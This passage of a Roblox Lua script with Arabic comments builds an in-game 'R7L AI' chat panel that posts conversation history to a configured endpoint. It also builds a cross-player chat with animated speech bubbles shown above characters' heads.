    body.AutomaticSize = Enum.AutomaticSize.Y
    body.BackgroundTransparency = 1
    body.Text = tostring(text)
    body.TextColor3 = Theme.Text
    body.TextXAlignment = isUser and Enum.TextXAlignment.Right or Enum.TextXAlignment.Left
    body.TextYAlignment = Enum.TextYAlignment.Top
    body.TextWrapped = true
    body.Font = Enum.Font.Gotham
    body.TextSize = 14
    body.LineHeight = 1.15
    body.ZIndex = 2
    body.Parent = bubble

    -- تأثير دخول ناعم (تلاشي + انزلاق بسيط)
    bubble.Position = bubble.Position + UDim2.new(0, 0, 0, 6)
    local targetPos = isUser and UDim2.new(0, 0, 0, 0) or UDim2.new(0, 30, 0, 0)
    game:GetService("TweenService"):Create(
        bubble, TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        { BackgroundTransparency = isUser and 0.08 or 0.02, Position = targetPos }
    ):Play()

    _R7LAIScrollToBottom()
    return wrapper
end

-- فقاعة "جالس يكتب..." بنقاط متحركة
local _typingWrapper = nil
local function _R7LAIShowTyping()
    if _typingWrapper then return end

    local wrapper = Instance.new("Frame")
    wrapper.Name = "TypingRow"
    wrapper.BackgroundTransparency = 1
    wrapper.Size = UDim2.new(1, -2, 0, 0)
    wrapper.AutomaticSize = Enum.AutomaticSize.Y
    wrapper.LayoutOrder = #AIChatScroll:GetChildren()
    wrapper.Parent = AIChatScroll
    _typingWrapper = wrapper

    local avatar = Instance.new("Frame")
    avatar.Size = UDim2.new(0, 24, 0, 24)
    avatar.BackgroundColor3 = Theme.ButtonDefault
    avatar.BorderSizePixel = 0
    avatar.Parent = wrapper
    makeCorner(avatar, 12)
    makeStroke(avatar, Theme.Border, 1, 0.2)
    local avatarLabel = Instance.new("TextLabel")
    avatarLabel.Size = UDim2.fromScale(1, 1)
    avatarLabel.BackgroundTransparency = 1
    avatarLabel.Text = "A"
    avatarLabel.TextColor3 = Theme.Text
    avatarLabel.Font = Enum.Font.GothamBold
    avatarLabel.TextSize = 12
    avatarLabel.Parent = avatar

    local bubble = Instance.new("Frame")
    bubble.Position = UDim2.new(0, 30, 0, 0)
    bubble.Size = UDim2.new(0, 52, 0, 30)
    bubble.BackgroundColor3 = Theme.PanelSoft
    bubble.BackgroundTransparency = 0.02
    bubble.BorderSizePixel = 0
    bubble.Parent = wrapper
    makeCorner(bubble, 10)
    makeStroke(bubble, Theme.Border, 1, 0.15)

    local dotsRow = Instance.new("Frame")
    dotsRow.Size = UDim2.new(0, 28, 0, 8)
    dotsRow.Position = UDim2.new(0.5, 0, 0.5, 0)
    dotsRow.AnchorPoint = Vector2.new(0.5, 0.5)
    dotsRow.BackgroundTransparency = 1
    dotsRow.Parent = bubble

    for i = 1, 3 do
        local dot = Instance.new("Frame")
        dot.Size = UDim2.new(0, 6, 0, 6)
        dot.Position = UDim2.new(0, (i - 1) * 11, 0.5, -3)
        dot.BackgroundColor3 = Theme.Muted
        dot.BorderSizePixel = 0
        dot.Parent = dotsRow
        makeCorner(dot, 3)
        task.spawn(function()
            task.wait((i - 1) * 0.15)
            while _typingWrapper == wrapper do
                game:GetService("TweenService"):Create(
                    dot, TweenInfo.new(0.35, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
                    { BackgroundTransparency = 0.75 }
                ):Play()
                task.wait(0.7)
            end
        end)
    end

    _R7LAIScrollToBottom()
end

local function _R7LAIHideTyping()
    if _typingWrapper then
        _typingWrapper:Destroy()
        _typingWrapper = nil
    end
end

-- ══════════════════════════════════════════════════════════
--  شريط الإدخال
-- ══════════════════════════════════════════════════════════
local AIInput = Instance.new("TextBox")
AIInput.Name = "R7LAIInput"
AIInput.Size = UDim2.new(1, -174, 0, 42)
AIInput.Position = UDim2.new(0, 10, 1, -52)
AIInput.BackgroundColor3 = Theme.PanelSoft
AIInput.BackgroundTransparency = 0.02
AIInput.BorderSizePixel = 0
AIInput.ClearTextOnFocus = false
AIInput.PlaceholderText = T18T("اكتب رسالتك لـ R7L AI...")
AIInput.PlaceholderColor3 = Theme.Muted
AIInput.Text = ""
AIInput.TextColor3 = Theme.Text
AIInput.TextXAlignment = Enum.TextXAlignment.Right
AIInput.Font = Enum.Font.Gotham
AIInput.TextSize = 14
AIInput.Parent = AIPage
makeCorner(AIInput, 10)
local AIInputStroke = makeStroke(AIInput, Theme.Border, 1, 0.25)

-- توهج خفيف حول الإدخال عند التركيز (تفصيلة صغيرة مريحة للعين)
AIInput.Focused:Connect(function()
    game:GetService("TweenService"):Create(
        AIInputStroke, TweenInfo.new(0.15), { Color = Theme.Text, Transparency = 0 }
    ):Play()
end)
AIInput.FocusLost:Connect(function()
    game:GetService("TweenService"):Create(
        AIInputStroke, TweenInfo.new(0.15), { Color = Theme.Border, Transparency = 0.25 }
    ):Play()
end)

local AIClearButton = Instance.new("TextButton")
AIClearButton.Name = "R7LAIClear"
AIClearButton.Size = UDim2.new(0, 58, 0, 42)
AIClearButton.Position = UDim2.new(1, -148, 1, -52)
AIClearButton.BackgroundColor3 = Theme.PanelSoft
AIClearButton.Text = T18T("مسح")
AIClearButton.TextColor3 = Theme.Text
AIClearButton.Font = Enum.Font.GothamBold
AIClearButton.TextSize = 13
AIClearButton.AutoButtonColor = true
AIClearButton.Parent = AIPage
makeCorner(AIClearButton, 10)
makeStroke(AIClearButton, Theme.Border, 1, 0.25)

local AISendButton = Instance.new("TextButton")
AISendButton.Name = "R7LAISend"
AISendButton.Size = UDim2.new(0, 72, 0, 42)
AISendButton.Position = UDim2.new(1, -82, 1, -52)
AISendButton.BackgroundColor3 = Theme.Active
AISendButton.Text = T18T("إرسال") .. "  →"
AISendButton.TextColor3 = Theme.Text
AISendButton.Font = Enum.Font.GothamBold
AISendButton.TextSize = 13
AISendButton.AutoButtonColor = true
AISendButton.Parent = AIPage
makeCorner(AISendButton, 10)
makeStroke(AISendButton, Theme.Border, 1, 0.2)

local function _R7LAISend()
    if _R7LAIBusy then return end
    local message = tostring(AIInput.Text or ""):gsub("^%s+", ""):gsub("%s+$", "")
    if message == "" then return end
    if type(T18_API_BASE) ~= "string" or not T18_API_BASE:match("^https?://") then
        _R7LAISetStatus(T18T("تحقق من رابط T18_API_BASE أولًا"), true)
        return
    end

    AIInput.Text = ""
    table.insert(_R7LAIHistory, { role = "user", content = message })
    while #_R7LAIHistory > 24 do table.remove(_R7LAIHistory, 1) end
    _R7LAIAddBubble("user", message)
    _R7LAIBusy = true
    AISendButton.Text = T18T("...")
    AISendButton.AutoButtonColor = false
    AISendButton.BackgroundColor3 = Theme.ButtonDefault
    _R7LAISetStatus(T18T("R7L AI يكتب الآن..."), false, true)
    _R7LAIShowTyping()

    task.spawn(function()
        local ok, response = pcall(function()
            return t18_httpRequest({
                Url = R7L_AI_ENDPOINT,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = t18_jsonEncode({ messages = _R7LAIHistory }),
            })
        end)

        local body = type(response) == "table" and (response.Body or response.body) or nil
        local statusCode = type(response) == "table" and (response.StatusCode or response.Status or response.status_code) or nil
        local result = body and t18_jsonDecode(body) or nil
        local reply = type(result) == "table" and (result.reply or result.output_text) or nil

        _R7LAIHideTyping()

        if ok and type(reply) == "string" and reply ~= "" and (not statusCode or (tonumber(statusCode) and tonumber(statusCode) >= 200 and tonumber(statusCode) < 300)) then
            table.insert(_R7LAIHistory, { role = "assistant", content = reply })
            while #_R7LAIHistory > 24 do table.remove(_R7LAIHistory, 1) end
            _R7LAIAddBubble("assistant", reply)
            _R7LAISetStatus(T18T("متصل"), false, false)
        else
            local detail = type(result) == "table" and (result.error or result.message) or nil
            _R7LAISetStatus(T18T("تعذر الاتصال: ") .. tostring(detail or (statusCode and ("HTTP " .. tostring(statusCode))) or T18T("تحقق من الرابط وإعدادات HTTP")), true, false)
        end
        _R7LAIBusy = false
        AISendButton.Text = T18T("إرسال") .. "  →"
        AISendButton.AutoButtonColor = true
        AISendButton.BackgroundColor3 = Theme.Active
    end)
end

AISendButton.MouseButton1Click:Connect(_R7LAISend)
AIInput.FocusLost:Connect(function(enterPressed)
    if enterPressed then _R7LAISend() end
end)
AIClearButton.MouseButton1Click:Connect(function()
    table.clear(_R7LAIHistory)
    _R7LAIHideTyping()
    for _, child in ipairs(AIChatScroll:GetChildren()) do
        if child ~= AIChatLayout and child ~= AIChatPadding then child:Destroy() end
    end
    _R7LAISetStatus(T18T("تم مسح المحادثة"), false, false)
end)

_R7LAIAddBubble("assistant", T18T("أهلًا، أنا R7L AI. اكتب رسالتك للبدء."))
end
_R7LABuildChatPage()
end

local ChatPanel = Instance.new("Frame")
ChatPanel.Name = "ChatPanel"
ChatPanel.AnchorPoint = Vector2.new(0, 0.5)
ChatPanel.Size = UDim2.new(1, -90, 0, 420)
ChatPanel.Position = UDim2.new(0, 80, 0.5, 0)
ChatPanel.BackgroundColor3 = Theme.Panel
ChatPanel.BorderSizePixel = 0
ChatPanel.Visible = false
ChatPanel.ZIndex = 18
ChatPanel.Parent = ScreenGui
makeCorner(ChatPanel, 16)
makeStroke(ChatPanel, Theme.Border, 1, 0.15)
ChatPanel.BackgroundTransparency = 0.45
ChatPanel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
makeShadow(ChatPanel)

local ChatPanelSizeConstraint = Instance.new("UISizeConstraint")
ChatPanelSizeConstraint.MaxSize = isTouchDevice and Vector2.new(240, 320) or Vector2.new(340, 460)
ChatPanelSizeConstraint.MinSize = isTouchDevice and Vector2.new(180, 200) or Vector2.new(240, 280)
ChatPanelSizeConstraint.Parent = ChatPanel

local ChatHeader = Instance.new("Frame")
ChatHeader.Size = UDim2.new(1, -20, 0, 44)
ChatHeader.Position = UDim2.new(0, 10, 0, 8)
ChatHeader.BackgroundTransparency = 1
ChatHeader.Parent = ChatPanel

local ChatHeaderTitle = Instance.new("TextLabel")
ChatHeaderTitle.Size = UDim2.new(1, -32, 0, 22)
ChatHeaderTitle.Position = UDim2.new(0, 0, 0, 0)
ChatHeaderTitle.BackgroundTransparency = 1
ChatHeaderTitle.Text = "شات"
ChatHeaderTitle.TextColor3 = Theme.Text
ChatHeaderTitle.TextXAlignment = Enum.TextXAlignment.Right
ChatHeaderTitle.Font = Enum.Font.GothamBold
ChatHeaderTitle.TextSize = 18
ChatHeaderTitle.Parent = ChatHeader

local ChatHeaderSub = Instance.new("TextLabel")
ChatHeaderSub.Size = UDim2.new(1, -32, 0, 16)
ChatHeaderSub.Position = UDim2.new(0, 0, 0, 24)
ChatHeaderSub.BackgroundTransparency = 1
ChatHeaderSub.Text = "تواصل بين مشغلي السكربت"
ChatHeaderSub.TextColor3 = Theme.Muted
ChatHeaderSub.TextXAlignment = Enum.TextXAlignment.Right
ChatHeaderSub.Font = Enum.Font.Gotham
ChatHeaderSub.TextSize = 12
ChatHeaderSub.Parent = ChatHeader

local ChatList = Instance.new("ScrollingFrame")
ChatList.Size = UDim2.new(1, -20, 1, -130)
ChatList.Position = UDim2.new(0, 10, 0, 64)
ChatList.BackgroundColor3 = Theme.Bg
ChatList.BorderSizePixel = 0
ChatList.ScrollBarThickness = 4
ChatList.ScrollBarImageColor3 = Theme.Active
ChatList.CanvasSize = UDim2.new(0, 0, 0, 0)
ChatList.AutomaticCanvasSize = Enum.AutomaticSize.Y
ChatList.Parent = ChatPanel
makeCorner(ChatList, 10)
makeStroke(ChatList, Theme.Border, 1, 0.2)
ChatList.BackgroundTransparency = 0.78

local ChatListLayout = Instance.new("UIListLayout")
ChatListLayout.Padding = UDim.new(0, 6)
ChatListLayout.SortOrder = Enum.SortOrder.LayoutOrder
ChatListLayout.Parent = ChatList

local ChatListPadding = Instance.new("UIPadding")
ChatListPadding.PaddingTop = UDim.new(0, 8)
ChatListPadding.PaddingBottom = UDim.new(0, 8)
ChatListPadding.PaddingLeft = UDim.new(0, 8)
ChatListPadding.PaddingRight = UDim.new(0, 8)
ChatListPadding.Parent = ChatList

local ChatInput = Instance.new("TextBox")
ChatInput.Size = UDim2.new(1, -110, 0, 40)
ChatInput.Position = UDim2.new(0, 10, 1, -50)
ChatInput.BackgroundColor3 = Theme.Input
ChatInput.BackgroundTransparency = 0.2
ChatInput.TextColor3 = Theme.Text
ChatInput.PlaceholderColor3 = Theme.Muted
ChatInput.PlaceholderText = "اكتب رسالة..."
ChatInput.Text = ""
ChatInput.Font = Enum.Font.Gotham
ChatInput.TextSize = 14
ChatInput.TextXAlignment = Enum.TextXAlignment.Right
ChatInput.ClearTextOnFocus = false
ChatInput.Parent = ChatPanel
makeCorner(ChatInput, 10)
makeStroke(ChatInput, Theme.Border, 1, 0.2)

local ChatSendBtn = Instance.new("TextButton")
ChatSendBtn.Size = UDim2.new(0, 90, 0, 40)
ChatSendBtn.Position = UDim2.new(1, -100, 1, -50)
ChatSendBtn.BackgroundColor3 = Theme.Active
ChatSendBtn.BackgroundTransparency = 0.18
ChatSendBtn.Text = "ارسال"
ChatSendBtn.TextColor3 = Theme.Text
ChatSendBtn.Font = Enum.Font.GothamBold
ChatSendBtn.TextSize = 14
ChatSendBtn.AutoButtonColor = false
ChatSendBtn.Parent = ChatPanel
makeCorner(ChatSendBtn, 10)
makeStroke(ChatSendBtn, Theme.Border, 1, 0.05)

local function addChatMessage(senderName, messageText, senderColor)
    local msgFrame = Instance.new("Frame")
    msgFrame.Size = UDim2.new(1, 0, 0, 0)
    msgFrame.AutomaticSize = Enum.AutomaticSize.Y
    msgFrame.BackgroundColor3 = Theme.PanelSoft
    msgFrame.BackgroundTransparency = 0.18
    msgFrame.BorderSizePixel = 0
    msgFrame.Parent = ChatList
    makeCorner(msgFrame, 8)

    local pad = Instance.new("UIPadding")
    pad.PaddingTop = UDim.new(0, 6)
    pad.PaddingBottom = UDim.new(0, 6)
    pad.PaddingLeft = UDim.new(0, 8)
    pad.PaddingRight = UDim.new(0, 8)
    pad.Parent = msgFrame

    local layout = Instance.new("UIListLayout")
    layout.SortOrder = Enum.SortOrder.LayoutOrder
    layout.Padding = UDim.new(0, 2)
    layout.Parent = msgFrame

    local senderLabel = Instance.new("TextLabel")
    senderLabel.Size = UDim2.new(1, 0, 0, 16)
    senderLabel.BackgroundTransparency = 1
    senderLabel.Text = senderName
    senderLabel.TextColor3 = senderColor or Theme.Warning
    senderLabel.TextXAlignment = Enum.TextXAlignment.Right
    senderLabel.Font = Enum.Font.GothamBold
    senderLabel.TextSize = 12
    senderLabel.LayoutOrder = 1
    senderLabel.Parent = msgFrame

    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, 0, 0, 0)
    textLabel.AutomaticSize = Enum.AutomaticSize.Y
    textLabel.BackgroundTransparency = 1
    textLabel.Text = messageText
    textLabel.TextColor3 = Theme.Text
    textLabel.TextXAlignment = Enum.TextXAlignment.Right
    textLabel.TextWrapped = true
    textLabel.Font = Enum.Font.Gotham
    textLabel.TextSize = 13
    textLabel.LayoutOrder = 2
    textLabel.Parent = msgFrame

    task.defer(function()
        ChatList.CanvasPosition = Vector2.new(0, ChatList.AbsoluteCanvasSize.Y)
    end)
end

function GetMyChatNameColorData()
    if ChatNameColorData then
        return ChatNameColorData
    end

    local generatedColor = Color3.fromHSV(
        Random.new():NextNumber(),
        0.72,
        1
    )

    ChatNameColorData = {
        r = math.floor(generatedColor.R * 255 + 0.5),
        g = math.floor(generatedColor.G * 255 + 0.5),
        b = math.floor(generatedColor.B * 255 + 0.5),
    }

    return ChatNameColorData
end

HeadChatBubbleState = HeadChatBubbleState or {}
HeadChatBubbleMessageId = HeadChatBubbleMessageId or 0

function GetHeadChatBubbleSpeakerKey(fromUserId, fromName)
    local numericUserId = tonumber(fromUserId)
    if numericUserId and numericUserId > 0 then
        return "uid:" .. tostring(numericUserId)
    end
    return "name:" .. tostring(fromName or "?"):lower()
end

function DestroyHeadChatBubbleStack(speakerKey)
    local state = HeadChatBubbleState[speakerKey]
    if not state then
        return
    end

    if state.guis then
        for _, gui in ipairs(state.guis) do
            pcall(function()
                gui:Destroy()
            end)
        end
    end

    state.guis = {}
end

_T18BC = {
    showDist = 35,
    hideDist = 45,
    font     = Enum.Font.SourceSansBold,
    fontSize = 19,
    maxW     = 280,
    minW     = 85,
    hPad     = 24,
    vPad     = 18,
}

function T18CalcBubbleDims(text)
    local ts     = game:GetService("TextService")
    local innerW = _T18BC.maxW - _T18BC.hPad

    local natural = ts:GetTextSize(text, _T18BC.fontSize, _T18BC.font, Vector2.new(10000, math.huge))

    local safeW   = natural.X * 1.18
    local lines   = math.max(1, math.ceil((safeW - 1) / innerW))
    local lineH   = _T18BC.fontSize * 1.4
    local neededW = math.min(safeW, innerW)
    local neededH = lines * lineH
    return math.clamp(neededW + _T18BC.hPad, _T18BC.minW, _T18BC.maxW),
           math.clamp(neededH + _T18BC.vPad, 36, 170)
end

function T18GetDistToHead(speakerHead)
    if not speakerHead or not speakerHead.Parent then return math.huge end
    local myChar  = LocalPlayer.Character
    local myRoot  = myChar and myChar:FindFirstChild("HumanoidRootPart")
    local cam     = workspace.CurrentCamera
    local camPos  = cam and cam.CFrame.Position
    local cd = myRoot  and (myRoot.Position - speakerHead.Position).Magnitude or math.huge
    local kd = camPos  and (camPos          - speakerHead.Position).Magnitude or math.huge
    return math.min(cd, kd)
end

function T18GetPPS(head, cam)
    if not head or not head.Parent or not cam then return 48 end
    local dist = (cam.CFrame.Position - head.Position).Magnitude
    if dist < 1 then dist = 1 end
    return math.clamp(
        cam.ViewportSize.Y / (2 * dist * math.tan(math.rad(cam.FieldOfView / 2))),
        6, 400
    )
end

HeadChatBubble_RestackStarted = HeadChatBubble_RestackStarted or false
if not HeadChatBubble_RestackStarted then
    HeadChatBubble_RestackStarted = true
    task.spawn(function()
        while T18RuntimeAlive() do
            game:GetService("RunService").RenderStepped:Wait()
            local cam = workspace.CurrentCamera
            if not cam or not HeadChatBubbleState then continue end
            for _, state in pairs(HeadChatBubbleState) do
                if not state.guis or #state.guis == 0 then continue end
                if not state._dims then continue end
                local head = state.head
                if not head or not head.Parent then continue end
                local pps = T18GetPPS(head, cam)
                local cur = 3.1
                for i = #state.guis, 1, -1 do
                    if state.guis[i] and state.guis[i].Parent then
                        state.guis[i].StudsOffset = Vector3.new(0, cur, 0)
                    end
                    if i > 1 and state._dims[i] and state._dims[i - 1] then

                        cur = cur + (state._dims[i] + state._dims[i - 1] + 20) / (2 * pps)
                    end
                end
            end
        end
    end)
end

function RenderHeadChatBubbleStack(speakerKey)
    local state = HeadChatBubbleState[speakerKey]
    if not state or not state.head then return end

    DestroyHeadChatBubbleStack(speakerKey)

    if not state.messages or #state.messages == 0 then
        HeadChatBubbleState[speakerKey] = nil
        return
    end

    state.guis  = {}
    state._dims = {}

    local TweenService = game:GetService("TweenService")
    local isDistHidden = state.distanceHidden == true

    local dims = {}
    for index, messageData in ipairs(state.messages) do
        local fw, fh = T18CalcBubbleDims(messageData.text)
        dims[index]  = { frameW = fw, frameH = fh }
    end

    local cam0  = workspace.CurrentCamera
    local pps0  = T18GetPPS(state.head, cam0)
    local offsets = {}
    local cur0  = 3.1
    for i = #state.messages, 1, -1 do
        offsets[i] = cur0
        if i > 1 then
            cur0 = cur0 + (dims[i].frameH + dims[i - 1].frameH + 20) / (2 * pps0)
        end
    end

    for index, messageData in ipairs(state.messages) do
        local isNewest = (index == #state.messages)
        local d        = dims[index]
        local guiH     = d.frameH + 5 + (isNewest and 12 or 0)
        local guiW     = d.frameW + 8

        local bubbleGui = Instance.new("BillboardGui")
        bubbleGui.Name        = "T18HeadChatBubble"
        bubbleGui.Adornee     = state.head
        bubbleGui.AlwaysOnTop = true
        bubbleGui.Size        = UDim2.new(0, guiW, 0, guiH)
        bubbleGui.StudsOffset = Vector3.new(0, offsets[index], 0)
        bubbleGui.Parent      = ScreenGui

        if isNewest then

            local tail = Instance.new("Frame")
            tail.Name                   = "BubbleTail"
            tail.AnchorPoint            = Vector2.new(0.5, 0.5)
            tail.Size                   = UDim2.new(0, 14, 0, 14)

            tail.Position               = UDim2.new(0.5, 0, 0, d.frameH + 1)
            tail.BackgroundColor3       = Color3.fromRGB(255, 255, 255)
            tail.BackgroundTransparency = 1
            tail.BorderSizePixel        = 0
            tail.Rotation               = 45
            tail.ZIndex                 = 1
            tail.Parent                 = bubbleGui
            makeCorner(tail, 2)

            local seamCover = Instance.new("Frame")
            seamCover.Name                   = "TailSeam"
            seamCover.AnchorPoint            = Vector2.new(0.5, 0)
            seamCover.Size                   = UDim2.new(0, 13, 0, 5)
            seamCover.Position               = UDim2.new(0.5, 0, 0, d.frameH - 2)
            seamCover.BackgroundColor3       = Color3.fromRGB(255, 255, 255)
            seamCover.BackgroundTransparency = 1
            seamCover.BorderSizePixel        = 0
            seamCover.ZIndex                 = 3
            seamCover.Parent                 = bubbleGui

            if not isDistHidden then
                TweenService:Create(tail,
                    TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                    { BackgroundTransparency = 0.02 }):Play()
                TweenService:Create(seamCover,
                    TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                    { BackgroundTransparency = 0.02 }):Play()
            end
        end

        local bubbleFrame = Instance.new("Frame")
        bubbleFrame.Name                   = "BubbleFrame"
        bubbleFrame.AnchorPoint            = Vector2.new(0.5, 0)
        bubbleFrame.Size                   = UDim2.new(0, d.frameW, 0, d.frameH)
        bubbleFrame.Position               = UDim2.new(0.5, 0, 0, 0)
        bubbleFrame.BackgroundColor3       = Color3.fromRGB(255, 255, 255)
        bubbleFrame.BackgroundTransparency = 1
        bubbleFrame.BorderSizePixel        = 0
        bubbleFrame.ZIndex                 = 2
        bubbleFrame.Parent                 = bubbleGui
        makeCorner(bubbleFrame, 18)
        makeStroke(bubbleFrame, Color3.fromRGB(0, 0, 0), 1, 0.9)

        local uiScale = Instance.new("UIScale")
        uiScale.Scale  = (isNewest and not isDistHidden) and 0.75 or 1.0
        uiScale.Parent = bubbleFrame

        local textHPad   = _T18BC.hPad - 4
        local bubbleText = Instance.new("TextLabel")
        bubbleText.Name               = "BubbleText"
        bubbleText.Size               = UDim2.new(1, -textHPad, 1, -8)
        bubbleText.Position           = UDim2.new(0, textHPad / 2, 0, 4)
        bubbleText.BackgroundTransparency = 1
        bubbleText.Text               = messageData.text
        bubbleText.TextColor3         = Color3.fromRGB(0, 0, 0)
        bubbleText.TextTransparency   = 1
        bubbleText.TextWrapped        = true
        bubbleText.TextXAlignment     = Enum.TextXAlignment.Center
        bubbleText.TextYAlignment     = Enum.TextYAlignment.Center
        bubbleText.Font               = _T18BC.font
        bubbleText.TextSize           = _T18BC.fontSize
        bubbleText.ZIndex             = 3
        bubbleText.Parent             = bubbleFrame

        if not isDistHidden then
            if isNewest then
                TweenService:Create(uiScale,
                    TweenInfo.new(0.26, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
                    { Scale = 1.0 }):Play()
                TweenService:Create(bubbleFrame,
                    TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                    { BackgroundTransparency = 0.02 }):Play()
                TweenService:Create(bubbleText,
                    TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                    { TextTransparency = 0 }):Play()
            else
                bubbleFrame.BackgroundTransparency = 0.02
                bubbleText.TextTransparency        = 0
            end
        end

        table.insert(state.guis,  bubbleGui)
        table.insert(state._dims, d.frameH)
    end
end

function ShowChatBubbleAboveHead(fromUserId, fromName, messageText)
    pcall(function()
        if not T18RuntimeAlive() then return end

        local cleanText = tostring(messageText or "")
        cleanText = cleanText:gsub("[\r\n]", " ")
        cleanText = cleanText:gsub("%s+", " ")
        cleanText = cleanText:gsub("^%s+", "")
        cleanText = cleanText:gsub("%s+$", "")
        cleanText = cleanText:gsub("^%[%[T18CLR:%d+,%d+,%d+%]%]", "")
        if #cleanText == 0 then return end
        if #cleanText > 120 then cleanText = cleanText:sub(1, 120) end

        local speaker       = nil
        local numericUserId = tonumber(fromUserId)
        for _, player in ipairs(Players:GetPlayers()) do
            if (numericUserId and numericUserId > 0 and player.UserId == numericUserId)
                or player.Name == fromName then
                speaker = player; break
            end
        end

        local character = speaker and speaker.Character
        local head      = character and character:FindFirstChild("Head")
        if not head then return end

        local speakerKey = GetHeadChatBubbleSpeakerKey(numericUserId or 0, fromName)
        if not HeadChatBubbleState[speakerKey] then
            HeadChatBubbleState[speakerKey] = { head = head, messages = {}, guis = {} }
        end

        local state           = HeadChatBubbleState[speakerKey]
        state.head            = head
        HeadChatBubbleMessageId = HeadChatBubbleMessageId + 1
        local queuedMessageId = HeadChatBubbleMessageId
        table.insert(state.messages, { text = cleanText, id = queuedMessageId })

        if #state.messages > 3 then
            table.remove(state.messages, 1)
        end

        state.distanceHidden = (T18GetDistToHead(head) > _T18BC.showDist)
        RenderHeadChatBubbleStack(speakerKey)

        if not state.distanceLoop then
            state.distanceLoop = task.spawn(function()
                local ts = game:GetService("TweenService")

                local function applyFadeIn(s)
                    for _, gui in ipairs(s.guis or {}) do
                        if not gui or not gui.Parent then continue end
                        local frame = gui:FindFirstChild("BubbleFrame")
                        local tail  = gui:FindFirstChild("BubbleTail")
                        local scale = frame and frame:FindFirstChildOfClass("UIScale")
                        local txt   = frame and frame:FindFirstChild("BubbleText")
                        if scale then scale.Scale = 0.75 end
                        if scale then ts:Create(scale, TweenInfo.new(0.26, Enum.EasingStyle.Back,  Enum.EasingDirection.Out), { Scale = 1.0 }):Play() end
                        if frame  then ts:Create(frame, TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundTransparency = 0.02 }):Play() end
                        if tail   then ts:Create(tail,  TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundTransparency = 0.02 }):Play() end
                        if txt    then ts:Create(txt,   TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { TextTransparency = 0 }):Play() end
                    end
                end

                local function applyFadeOut(s)
                    for _, gui in ipairs(s.guis or {}) do
                        if not gui or not gui.Parent then continue end
                        local frame = gui:FindFirstChild("BubbleFrame")
                        local tail  = gui:FindFirstChild("BubbleTail")
                        local txt   = frame and frame:FindFirstChild("BubbleText")
                        if frame then ts:Create(frame, TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundTransparency = 1 }):Play() end
                        if tail  then ts:Create(tail,  TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundTransparency = 1 }):Play() end
                        if txt   then ts:Create(txt,   TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { TextTransparency = 1 }):Play() end
                    end
                end

                while T18RuntimeAlive() do
                    local s = HeadChatBubbleState[speakerKey]
                    if not s or not s.messages or #s.messages == 0 then break end
                    local dist      = T18GetDistToHead(s.head)
                    local wasHidden = s.distanceHidden == true
                    if wasHidden and dist <= _T18BC.showDist then
                        s.distanceHidden = false
                        applyFadeIn(s)
                    elseif not wasHidden and dist > _T18BC.hideDist then
                        s.distanceHidden = true
                        applyFadeOut(s)
                    end
                    task.wait(0.15)
                end

                if HeadChatBubbleState[speakerKey] then
                    HeadChatBubbleState[speakerKey].distanceLoop = nil
                end
            end)
        end

        task.spawn(function()
            local targetId = queuedMessageId
            task.wait(9.5)
            if not T18RuntimeAlive() then return end
            local s = HeadChatBubbleState[speakerKey]
            if not s or not s.messages then return end

            local msgIndex = nil
            for i, md in ipairs(s.messages) do
                if md.id == targetId then msgIndex = i; break end
            end
            if not msgIndex then return end

            local ts2 = game:GetService("TweenService")
            local gui = s.guis and s.guis[msgIndex]
            if gui and gui.Parent then
                local frame = gui:FindFirstChild("BubbleFrame")
                local tail  = gui:FindFirstChild("BubbleTail")
                if frame then
                    ts2:Create(frame, TweenInfo.new(0.45, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundTransparency = 1 }):Play()
                    local txt = frame:FindFirstChild("BubbleText")
                    if txt then ts2:Create(txt, TweenInfo.new(0.45), { TextTransparency = 1 }):Play() end
                end
                if tail then ts2:Create(tail, TweenInfo.new(0.45), { BackgroundTransparency = 1 }):Play() end
            end

            task.wait(0.45)

            local s2 = HeadChatBubbleState[speakerKey]
            if not s2 or not s2.messages then return end
            local expIdx = nil
            for i, md in ipairs(s2.messages) do
                if md.id == targetId then expIdx = i; break end
            end
            if not expIdx then return end

            if s2.guis and s2.guis[expIdx] then
                s2.guis[expIdx]:Destroy()
                table.remove(s2.guis, expIdx)
            end
            if s2._dims then table.remove(s2._dims, expIdx) end
            table.remove(s2.messages, expIdx)

            if #s2.messages == 0 then
                HeadChatBubbleState[speakerKey] = nil
            end

        end)
    end)
end

local function sendChatToAll(messageText)
    if type(messageText) ~= "string" or #messageText == 0 then return false end
    if #messageText > 200 then messageText = messageText:sub(1, 200) end
    local cleanMsg = messageText:gsub("[\r\n]", " ")
    local colorData = GetMyChatNameColorData()
    cleanMsg = string.format("[[T18CLR:%d,%d,%d]]%s", colorData.r, colorData.g, colorData.b, cleanMsg)
    return t18_postEvent({
        type = "chat",
        text = cleanMsg,
        nameColor = GetMyChatNameColorData(),
    })
end

local _Flags = {chatCooldown=false, hdCopy=false}
local function trySendChatFromInput()
    if _Flags.chatCooldown then return end
    local txt = ChatInput.Text
    if not txt or #txt == 0 then return end
    _Flags.chatCooldown = true
    local sent = sendChatToAll(txt)
    if sent then ChatInput.Text = "" end
    task.delay(0.8, function() _Flags.chatCooldown = false end)
end

ChatSendBtn.MouseButton1Click:Connect(trySendChatFromInput)
ChatInput.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        trySendChatFromInput()
    end
end)

